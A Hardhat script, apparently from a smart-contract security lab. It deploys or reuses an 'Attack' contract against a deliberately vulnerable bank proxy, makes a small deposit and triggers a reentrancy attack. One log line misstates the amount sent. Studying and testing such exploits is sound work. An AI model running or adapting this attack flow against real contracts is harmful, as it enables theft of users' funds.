const { ethers } = require("hardhat");
const fs = require("fs");

async function main() {
  try {
    // Load the addresses from addresses.json
    const addressesPath = "./addresses.json";
    let addresses = {};
    if (fs.existsSync(addressesPath)) {
      addresses = JSON.parse(fs.readFileSync(addressesPath));
    }

    // Get the provider and both signers
    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
    const [attacker, deployer] = await ethers.getSigners();

    console.log(`Attacker address: ${attacker.address}`);
    console.log(`Deployer address: ${deployer.address}`);

    let attackContract;
    let attackContractAddress;

    if (addresses.ReentrancyAttack) {
      // If ReentrancyAttack address exists, attach to it
      attackContractAddress = addresses.ReentrancyAttack;
      console.log(`Found existing ReentrancyAttack contract at: ${attackContractAddress}`);

      const Attack = await ethers.getContractFactory("Attack", attacker);
      attackContract = Attack.attach(attackContractAddress);
    } else {
      // If ReentrancyAttack address does not exist, deploy a new contract
      console.log("ReentrancyAttack contract not found, deploying a new one...");

      // Load the proxy address from addresses.json (ensure it exists)
      const proxyAddress = addresses.VulnerableBankV1UUPSProxy;
      if (!proxyAddress) {
        throw new Error("Proxy address not found in addresses.json.");
      }

      // Deploy the Attack contract with the proxy address
      const Attack = await ethers.getContractFactory("Attack", attacker);
      attackContract = await Attack.deploy(proxyAddress);

      // Wait for the contract deployment to complete
      await attackContract.waitForDeployment();

      // Get the deployed contract address
      attackContractAddress = await attackContract.getAddress();
      console.log(`Deployed ReentrancyAttack contract at: ${attackContractAddress}`);

      // Save the new contract address to addresses.json
      addresses.ReentrancyAttack = attackContractAddress;
      fs.writeFileSync(addressesPath, JSON.stringify(addresses, null, 2));
    }

    // Log the balance of the attacker
    const attackerBalance = await provider.getBalance(attacker.address);
    console.log(`Attacker balance: ${ethers.formatEther(attackerBalance)} ETH`);

    // Call the deposit function in the proxy contract using the deployer
    console.log(`Calling deposit function in proxy contract at: ${addresses.VulnerableBankV1UUPSProxy}`);
    const proxyContract = new ethers.Contract(
      addresses.VulnerableBankV1UUPSProxy,
      [
        // ABI fragment for the deposit function
        "function deposit() payable"
      ],
      deployer
    );
    const depositTx = await proxyContract.deposit({
      value: ethers.parseEther("0.00005"),
      gasLimit: 3000000,  // Adjust gas limit as needed
      // maxPriorityFeePerGas: ethers.parseUnits('2', 'gwei'),  // Set the priority fee (tip) per gas unit
      // maxFeePerGas: ethers.parseUnits('100', 'gwei')
    });
    await depositTx.wait();
    console.log("0.00005 ETH Deposited successfully by deployer.");

    // Prepare the transaction data for the attack function
    const txData = attackContract.interface.encodeFunctionData("attack", []);

    // Log the transaction data
    // console.log(`Encoded function data: ${txData}`);

    // Create a transaction object for the attack
    const tx = {
      to: attackContractAddress,
      value: ethers.parseEther("0.00001"),  // Adjust the value to send with the transaction
      gasLimit: 3000000,  // Adjust gas limit as needed
      // maxPriorityFeePerGas: ethers.parseUnits('3', 'gwei'),  // Set the priority fee (tip) per gas unit
      // maxFeePerGas: ethers.parseUnits('100', 'gwei'),
      data: txData
    };

    // Send the transaction using the attacker signer
    console.log(`Sending transaction to ${attackContractAddress} with value: 0.001 ETH`);
    const txResponse = await attacker.sendTransaction(tx);

    // Wait for the transaction to be mined with reentrancy loop handling
      try {
        const receipt = await txResponse.wait();
        console.log("Reentrancy Transaction successful. Transaction hash:", receipt.hash);
      } catch (error) {
        console.error(`Transaction failed :`, error);
      }
    } catch (error) {
    console.error("Transaction failed:", error);
    process.exitCode = 1;
  }
}
// Run the script
main();
